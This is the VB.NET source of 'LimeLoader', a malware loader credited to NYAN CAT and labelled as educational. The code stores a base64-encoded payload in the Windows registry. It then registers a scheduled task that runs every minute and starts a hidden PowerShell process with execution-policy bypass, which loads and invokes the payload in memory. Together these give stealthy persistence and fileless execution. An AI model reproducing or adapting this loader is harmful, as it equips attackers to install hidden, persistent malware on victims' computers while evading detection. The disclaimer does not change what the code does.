
'       ││ Author     : NYAN CAT
'       ││ Name       : LimeLoader * 25/11/2018

'       ││ Contact    : https://github.com/NYAN-x-CAT

'       ## This program Is distributed for educational purposes only.


Public Class Program
    Public Shared Sub Main()


        '││ Convert our payload "resources" to base64
        Dim Payload As String = Nothing
        Try
            Payload = Convert.ToBase64String(My.Resources.SimpleApp)
        Catch ex As Exception
            Diagnostics.Debug.WriteLine("[ToBase64String] " + ex.Message)
        End Try


        '|| Insert it to registry to use it later
        Try
            Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\LimeLoader-Test").SetValue("Payload", Payload)
        Catch ex As Exception
            Diagnostics.Debug.WriteLine("[Registry] " + ex.Message)
        End Try


        '││ Using task scheduler to run powershell command to execute our registry-payload
        '││ docs.microsoft.com/en-us/powershell/scripting/core-powershell/console/powershell.exe-command-line-help?view=powershell-6
        '││ docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-itemproperty?view=powershell-6
        Dim PS As String = Nothing
        Try
            PS = "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -NoExit -Command [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String((Get-ItemProperty HKCU:\Software\LimeLoader-Test\).Payload)).EntryPoint.Invoke($Null,$Null)"
            Diagnostics.Process.Start(New Diagnostics.ProcessStartInfo() With {
                .FileName = "schtasks",
                .Arguments = "/create /sc minute /mo 1 /tn LimeLoader /tr " + """" + PS & """",
                .CreateNoWindow = True,
                .ErrorDialog = False,
                .WindowStyle = Diagnostics.ProcessWindowStyle.Hidden
                })
        Catch ex As Exception
            Diagnostics.Debug.WriteLine("[Process.Start] " + ex.Message)
        End Try


    End Sub
End Class